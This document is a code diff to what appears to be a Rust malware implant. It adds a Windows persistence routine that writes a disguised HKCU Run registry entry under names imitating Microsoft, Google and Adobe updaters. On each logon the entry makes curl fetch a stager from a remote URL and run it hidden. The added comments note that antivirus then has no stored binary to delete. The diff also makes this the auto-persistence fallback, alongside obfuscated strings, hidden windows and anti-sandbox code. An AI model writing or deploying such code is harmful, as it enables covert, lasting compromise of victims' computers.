@@ -1041,6 +1041,53 @@ fn persist_lolbas_certutil(exe_path: &Path) -> Result<String, String> {
     }
 }
 
+/// HKCU Run key using curl.exe to download + run the stager on every logon.
+/// No file is permanently stored — curl drops to %TEMP% fresh each time,
+/// so AV has no static binary to delete between reboots.
+/// curl.exe ships with Windows 10 1803+ (C:\Windows\System32\curl.exe).
+#[cfg(target_os = "windows")]
+fn persist_run_curl(download_url: &str) -> Result<String, String> {
+    let idx = get_machine_index();
+
+    let reg_names = [
+        "MicrosoftEdgeUpdateCore",
+        "OneDriveStandaloneSync",
+        "GoogleUpdateCore",
+        "AdobeAcrobatSync",
+    ];
+    let drop_names = [
+        "MsEdgeCore.exe",
+        "OneDriveCore.exe",
+        "GoogleCore.exe",
+        "AcrobatCore.exe",
+    ];
+    let reg_name  = reg_names[idx % reg_names.len()];
+    let drop_name = drop_names[idx % drop_names.len()];
+
+    // cmd /c: curl downloads to %TEMP%\<name>, then start /min runs it hidden.
+    // cmd /c is required because the Run key doesn't expand shell builtins.
+    let run_cmd = format!(
+        "cmd.exe /c curl -s -L \"{}\" -o \"%TEMP%\\{}\" && start /min \"\" \"%TEMP%\\{}\"",
+        download_url, drop_name, drop_name
+    );
+
+    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+    let reg_exe = obfstr!("reg").to_string();
+
+    let output = Command::new(&reg_exe)
+        .args(&["add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &run_cmd, "/f"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("Run curl registry failed: {}", e))?;
+
+    if output.status.success() {
+        debug_print!("[PERSIST] Run curl key set: {} -> curl {}", reg_name, download_url);
+        Ok(format!("HKCU\\Run curl: {} downloads {}", reg_name, download_url))
+    } else {
+        Err(format!("Run curl failed: {}", String::from_utf8_lossy(&output.stderr).trim()))
+    }
+}
+
 // ============================================================================
 // Environment Keying / Anti-Sandbox
 // ============================================================================
@@ -1548,23 +1595,26 @@ pub fn do_auto_persistence_work() {
         ) {
             Ok(msg) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ✅ Fileless schtask established: {}",
+                    "DEBUG: [AUTO-PERSIST] ✅ schtask curl persistence established: {}",
                     msg
                 );
                 return;
             }
             Err(e) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ⚠️ Fileless schtask failed: {}, trying fallback...",
+                    "DEBUG: [AUTO-PERSIST] ⚠️ schtask failed: {}, trying HKCU Run curl fallback...",
                     e
                 );
             }
         }
 
-        match establish_persistence(PersistenceMethod::WmiEvent) {
+        // Fallback: HKCU\Run with curl — no file copy, no PS/AMSI surface.
+        // curl downloads ester fresh on each logon; the binary is never stored
+        // permanently so AV has nothing static to delete.
+        match persist_run_curl(crate::config::STAGER_URL) {
             Ok(msg) => {
                 debug_print!(
-                    "DEBUG: [AUTO-PERSIST] ✅ Logon script fallback established: {}",
+                    "DEBUG: [AUTO-PERSIST] ✅ Run curl fallback established: {}",
                     msg
                 );
             }
